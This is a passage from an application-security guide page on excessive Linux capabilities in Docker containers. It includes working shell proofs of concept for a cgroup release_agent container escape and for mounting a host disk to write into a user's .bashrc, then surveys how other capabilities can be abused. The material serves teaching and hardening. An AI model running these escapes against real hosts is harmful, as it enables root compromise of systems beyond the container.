t=`sed -n <span class="hljs-string">&apos;s/.*\perdir=\([^,]*\).*/\1/p&apos;</span> /etc/mtab`
<span class="hljs-comment"># Sets release_agent to /path/payload</span>
touch /o; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$t</span>/c &gt; <span class="hljs-variable">$d</span>/release_agent
<span class="hljs-comment"># Creates a payload</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh&quot;</span> &gt; /c
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ps &gt; <span class="hljs-variable">$t</span>/o&quot;</span> &gt;&gt; /c
chmod +x /c
<span class="hljs-comment"># Triggers the cgroup via empty cgroup.procs</span>
sh -c <span class="hljs-string">&quot;echo 0 &gt; <span class="hljs-variable">$d</span>/w/cgroup.procs&quot;</span>; sleep 1
<span class="hljs-comment"># Reads the output</span>
cat /o
</code></pre>
<h3 id="requirements-to-use-this-technique"><a name="requirements-to-use-this-technique" class="anchor-navigation-ex-anchor" href="#requirements-to-use-this-technique"><i class="fa fa-link" aria-hidden="true"></i></a>Requirements to use this technique</h3>
<p>In fact, <code>--privileged</code> provides far more permissions than needed to escape a Docker container via this method. In reality, the &quot;only&quot; requirements are:</p>
<ul>
<li>You must be running as root inside the container.</li>
<li>The container must be run with the <code>CAP_SYS_ADMIN</code> Linux capability.</li>
<li>The container must lack an AppArmor profile, or otherwise allow the mount syscall.</li>
<li>The cgroup v1 virtual filesystem must be mounted read-write inside the container.</li>
</ul>
<h3 id="using-cgroups-to-deliver-the-exploit"><a name="using-cgroups-to-deliver-the-exploit" class="anchor-navigation-ex-anchor" href="#using-cgroups-to-deliver-the-exploit"><i class="fa fa-link" aria-hidden="true"></i></a>Using cgroups to deliver the exploit</h3>
<p>The PoC abuses the functionality of the <code>notify_on_release</code> feature in cgroups v1 to run the exploit as a fully privileged root user.</p>
<p>When the last task in a cgroup leaves (by exiting or attaching to another cgroup), a command supplied in the <code>release_agent</code> file is executed. The intended use for this is to help prune abandoned cgroups. This command, when invoked, is run as a fully privileged root on the host.</p>
<p><a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt" target="_blank">What does notify_on_release do?</a></p>
<p>If the <code>notify_on_release</code> flag is enabled in a cgroup, then whenever the last task in the cgroup leaves (exits or attaches to some other cgroup) and the last child cgroup of that cgroup is removed, then the kernel runs the command specified by the contents of the <code>release_agent</code> file in that hierarchy&apos;s root directory, supplying the pathname (relative to the mount point of the cgroup file system) of the abandoned cgroup. This enables automatic removal of abandoned cgroups. The default value of <code>notify_on_release</code> in the root cgroup at system boot is disabled. The default value of other cgroups at creation is the current value of their parents <code>notify_on_release</code> settings. The default value of a cgroup hierarchy&apos;s <code>release_agent</code> path is empty.</p>
<h3 id="escape-only-with-capsysadmin-capability"><a name="escape-only-with-capsysadmin-capability" class="anchor-navigation-ex-anchor" href="#escape-only-with-capsysadmin-capability"><i class="fa fa-link" aria-hidden="true"></i></a>Escape only with CAP_SYS_ADMIN capability</h3>
<p>There is a simpler way to write this exploit so it works without the <code>--privileged</code> flag. In this scenario, you won&apos;t have access to a read-write cgroup mount provided by <code>--privileged</code>. For this you will just mount the cgroup as read-write ourselves. This adds one extra line to the exploit but requires fewer privileges.</p>
<p>An example of a command to run the container on the host:</p>
<pre><code class="lang-bash">$ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
</code></pre>
<p>The exploit below will execute a <code>ps aux</code> command on the host and save its output to the <code>/output</code> file in the container. It uses the same <code>release_agent</code> feature as the original PoC to execute on the host.</p>
<pre><code class="lang-bash"><span class="hljs-comment"># Mounts the RDMA cgroup controller and create a child cgroup</span>
<span class="hljs-comment"># This technique should work with the majority of cgroup controllers</span>
<span class="hljs-comment"># If you&apos;re following along and get &quot;mount: /tmp/cgrp: special device cgroup does not exist&quot;</span>
<span class="hljs-comment"># It&apos;s because your setup doesn&apos;t have the RDMA cgroup controller, try change rdma to memory to fix it</span>
mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x
<span class="hljs-comment"># Enables cgroup notifications on release of the &quot;x&quot; cgroup</span>
<span class="hljs-built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release
<span class="hljs-comment"># Finds path of OverlayFS mount for container</span>
<span class="hljs-comment"># Unless the configuration explicitly exposes the mount point of the host filesystem</span>
<span class="hljs-comment"># see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html</span>
host_path=`sed -n <span class="hljs-string">&apos;s/.*\perdir=\([^,]*\).*/\1/p&apos;</span> /etc/mtab`
<span class="hljs-comment"># Sets release_agent to /path/payload</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/cgrp/release_agent
<span class="hljs-comment"># Creates a payload</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh&quot;</span> &gt; /cmd
<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ps aux &gt; <span class="hljs-variable">$host_path</span>/output&quot;</span> &gt;&gt; /cmd
chmod a+x /cmd
<span class="hljs-comment"># Executes the attack by spawning a process that immediately ends inside the &quot;x&quot; child cgroup</span>
<span class="hljs-comment"># By creating a /bin/sh process and writing its PID to the cgroup.procs file in &quot;x&quot; child cgroup directory</span>
<span class="hljs-comment"># The script on the host will execute after /bin/sh exits </span>
sh -c <span class="hljs-string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span>
<span class="hljs-comment"># Reads the output</span>
cat /output
</code></pre>
<h2 id="abusing-exposed-host-directories"><a name="abusing-exposed-host-directories" class="anchor-navigation-ex-anchor" href="#abusing-exposed-host-directories"><i class="fa fa-link" aria-hidden="true"></i></a>Abusing exposed host directories</h2>
<p>Assusme, the <code>/home</code> directory is exposed by <code>/dev/sdb1</code> within a privileged container. In such case, you can generate a device node for that block device, mount it into the container, and gain access to host&apos;s <code>/home</code> directory.</p>
<pre><code class="lang-bash">$ docker run --privileged -it --rm alpine:latest
/ $ apk update &amp;&amp; apk add util-linux
<span class="hljs-comment"># ...</span>
/ $ lsblk
NAME      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda         8:0    0   45G  0 disk
&#x251C;&#x2500;sda1      8:1    0 40.9G  0 part /etc/hosts
&#x251C;&#x2500;sda2      8:2    0   16M  0 part
&#x251C;&#x2500;sda3      8:3    0    2G  0 part
&#x2502; &#x2514;&#x2500;vroot 253:0    0  1.2G  1 dm
&#x251C;&#x2500;sda4      8:4    0   16M  0 part
&#x251C;&#x2500;sda5      8:5    0    2G  0 part
&#x251C;&#x2500;sda6      8:6    0  512B  0 part
&#x251C;&#x2500;sda7      8:7    0  512B  0 part
&#x251C;&#x2500;sda8      8:8    0   16M  0 part
&#x251C;&#x2500;sda9      8:9    0  512B  0 part
&#x251C;&#x2500;sda10     8:10   0  512B  0 part
&#x251C;&#x2500;sda11     8:11   0    8M  0 part
&#x2514;&#x2500;sda12     8:12   0   32M  0 part
sdb         8:16   0    5G  0 disk
&#x2514;&#x2500;sdb1      8:17   0    5G  0 part
zram0     252:0    0  768M  0 disk [SWAP]
/ $ mknod /dev/sdb1 block 8 17
/ $ mkdir /mnt/host_home
/ $ mount /dev/sdb1 /mnt/host_home
/ $ <span class="hljs-built_in">echo</span> <span class="hljs-string">&apos;echo &quot;Hello from container land!&quot; 2&gt;&amp;1&apos;</span> &gt;&gt; /mnt/host_home/eric_chiang_m/.bashrc
</code></pre>
<p>References:</p>
<ul>
<li><a href="https://ericchiang.github.io/post/privileged-containers/" target="_blank">Writeup: Privileged Containers Aren&apos;t Containers</a></li>
</ul>
<h1 id="capsysmodule"><a name="capsysmodule" class="anchor-navigation-ex-anchor" href="#capsysmodule"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_SYS_MODULE</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_SYS_MODULE</a> allows the process to load and unload arbitrary kernel modules (<code>init_module(2)</code>, <code>finit_module(2)</code> and <code>delete_module(2)</code> system calls). This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.</p>
<p> {% hint style=&quot;info&quot; %} 
CAP_SYS_MODULE capability dropped by Docker in privileged containers.
 {% endhint %} </p>
<p>References:</p>
<ul>
<li><a href="https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host" target="_blank">Writeup: How I Hacked Play-with-Docker and Remotely Ran Code on the Host</a></li>
</ul>
<h1 id="capsysrawio"><a name="capsysrawio" class="anchor-navigation-ex-anchor" href="#capsysrawio"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_SYS_RAWIO</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_SYS_RAWIO</a> provides a number of sensitive operations including access to <code>/dev/mem</code>, <code>/dev/kmem</code> or <code>/proc/kcore</code>, modify <code>mmap_min_addr</code>, access <code>ioperm(2)</code> and <code>iopl(2)</code> system calls, and various disk commands. The <code>FIBMAP ioctl(2)</code> is also enabled via this capability, which has caused issues in the <a href="http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html" target="_blank">past</a>. As per the man page, this also allows the holder to descriptively <code>perform a range of device-specific operations on other devices</code>. </p>
<h1 id="capnetadmin"><a name="capnetadmin" class="anchor-navigation-ex-anchor" href="#capnetadmin"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_NET_ADMIN</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_NET_ADMIN</a> allows the capability holder to modify the exposed network namespaces&apos; firewall, routing tables, socket permissions, network interface configuration and other related settings on exposed network interfaces. This also provides the ability to enable promiscuous mode for the attached network interfaces and potentially sniff across namespaces.</p>
<p>It should be noted several privilege escalation vulnerabilities and other historical weaknesses have resulted from the ability to leverage this capability. This includes CVE-2011-1019 which effectively granted the CAP_SYS_MODULE capability to load arbitrary modules and was exploited trivially using ifconfig CVE-2010-4655 which resulted in a sensitive heap memory disclosure and CVE-2013-4514 resulting in Denial of Service and possibly arbitrary code execution. These issues are largely due to the significant attack surface and implicit module loading for special interfaces or socket types.</p>
<h1 id="capsyschroot"><a name="capsyschroot" class="anchor-navigation-ex-anchor" href="#capsyschroot"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_SYS_CHROOT</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_SYS_CHROOT</a> permits the use of the <code>chroot(2)</code> system call. This may allow escaping of any <code>chroot(2)</code> environment, using known weaknesses and escapes:</p>
<ul>
<li><a href="https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf" target="_blank">How to break out from various chroot solutions</a></li>
<li><a href="https://github.com/earthquake/chw00t/" target="_blank">chw00t: chroot escape tool</a></li>
</ul>
<h1 id="capsysptrace"><a name="capsysptrace" class="anchor-navigation-ex-anchor" href="#capsysptrace"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_SYS_PTRACE</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_SYS_PTRACE</a> allows to use <code>ptrace(2)</code> and recently introduced cross memory attach system calls such as <code>process_vm_readv(2)</code> and <code>process_vm_writev(2)</code>. If this capability is granted and the <code>ptrace(2)</code> system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see <a href="https://gist.github.com/thejh/8346f47e359adecd1d53" target="_blank">PoC for bypassing seccomp if ptrace is allowed</a>. </p>
<h1 id="capnetraw"><a name="capnetraw" class="anchor-navigation-ex-anchor" href="#capnetraw"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_NET_RAW</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_NET_RAW</a> allows a process to be able to create RAW and PACKET socket types for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or compromised container to spoof packets at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.</p>
<p>Docker setup container networking so that all containers share the same Linux virtual bridge. These containers will be able to communicate with each other. Even if this direct network access is disabled (using the <code>-icc=false</code> flag for Docker), containers are not restricted for link-layer traffic. In particular, it is possible (and in fact quite easy) to conduct an ARP spoofing attack on another container within the same host system, allowing full middle-person attacks of the targeted container&apos;s traffic.</p>
<h1 id="capsysboot"><a name="capsysboot" class="anchor-navigation-ex-anchor" href="#capsysboot"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_SYS_BOOT</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_SYS_BOOT</a> allows to use the <code>reboot(2)</code> syscall. It also allows for executing an arbitrary reboot command via <code>LINUX_REBOOT_CMD_RESTART2</code>, implemented for some specific hardware platforms. </p>
<p>This capability also permits use of the <code>kexec_load(2)</code> system call, which loads a new crash kernel and as of Linux 3.17, the <code>kexec_file_load(2)</code> which also will load signed kernels.</p>
<h1 id="capsyslog"><a name="capsyslog" class="anchor-navigation-ex-anchor" href="#capsyslog"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_SYSLOG</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_SYSLOG</a> was finally forked in Linux 2.6.37 from the <code>CAP_SYS_ADMIN</code> catchall, this capability allows the process to use the <code>syslog(2)</code> system call. This also allows the process to view kernel addresses exposed via <code>/proc</code> and other interfaces when <code>/proc/sys/kernel/kptr_restrict</code> is set to 1.</p>
<p>The <code>kptr_restrict</code> sysctl setting was introduced in 2.6.38, and determines if kernel addresses are exposed. This defaults to zero (exposing kernel addresses) since 2.6.39 within the vanilla kernel, although many distributions correctly set the value to 1 (hide from everyone accept uid 0) or 2 (always hide).</p>
<p>In addition, this capability also allows the process to view <code>dmesg</code> output, if the <code>dmesg_restrict</code> setting is 1. Finally, the <code>CAP_SYS_ADMIN</code> capability is still permitted to perform <code>syslog</code> operations itself for historical reasons.</p>
<h1 id="capdacreadsearch"><a name="capdacreadsearch" class="anchor-navigation-ex-anchor" href="#capdacreadsearch"><i class="fa fa-link" aria-hidden="true"></i></a>CAP_DAC_READ_SEARCH</h1>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">CAP_DAC_READ_SEARCH</a> allows a process to bypass file read, and directory read and execute permissions. While this was designed to be used for searching or reading files, it also grants the process permission to invoke <code>open_by_handle_at(2)</code>. Any process with the capability <code>CAP_DAC_READ_SEARCH</code> can use <code>open_by_handle_at(2)</code> to gain access to any file, even files outside their mount namespace. The handle passed into <code>open_by_handle_at(2)</code> is intended to be an opaque identifier retrieved using <code>name_to_handle_at(2)</code>. However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with <a href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3" target="_blank">shocker</a> exploit.</p>
<blockquote>
<p>Docker has mitigated this issue by dropping CAP_DAC_READ_SEARCH (as well as blocking access to open_by_handle_at using seccomp)</p>
</blockquote>
<h1 id="references"><a name="references" class="anchor-navigation-ex-anchor" href="#references"><i class="fa fa-link" aria-hidden="true"></i></a>References</h1>
<ul>
<li><a href="https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf" target="_blank">Understanding and Hardening Linux Containers</a></li>
<li><a href="https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf" target="_blank">Abusing Privileged and Unprivileged Linux Containers</a></li>
<li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank">Understanding Docker container escapes</a></li>
</ul>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="exposed-docker-socket.html" class="navigation navigation-prev " aria-label="Previous page: Exposed Docker Socket">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="host-networking-driver.html" class="navigation navigation-next " aria-label="Next page: Host Networking Driver">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Excessive Capabilities","level":"4.2.3","depth":2,"next":{"title":"Host Networking Driver","level":"4.2.4","depth":2,"path":"Container/Escaping/host-networking-driver.md","ref":"Container/Escaping/host-networking-driver.md","articles":[]},"previous":{"title":"Exposed Docker Socket","level":"4.2.2","depth":2,"path":"Container/Escaping/exposed-docker-socket.md","ref":"Container/Escaping/exposed-docker-socket.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["anchor-navigation-ex","edit-link","copy-code-button","theme-comscore","ga"],"pluginsConfig":{"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"fontSettings":{"theme":"night","family":"sans"},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":false,"pageTop":{"level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"copy-code-button":{},"ga":{"configuration":"auto","token":""},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"edit-link":{"label":"Edit This Page","base":"https://github.com/sm2774us/application_security/edit/master/"},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Container/Escaping/excessive-capabilities.md","mtime":"2022-02-25T04:54:13.436Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-02-25T04:54:42.293Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-edit-link/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

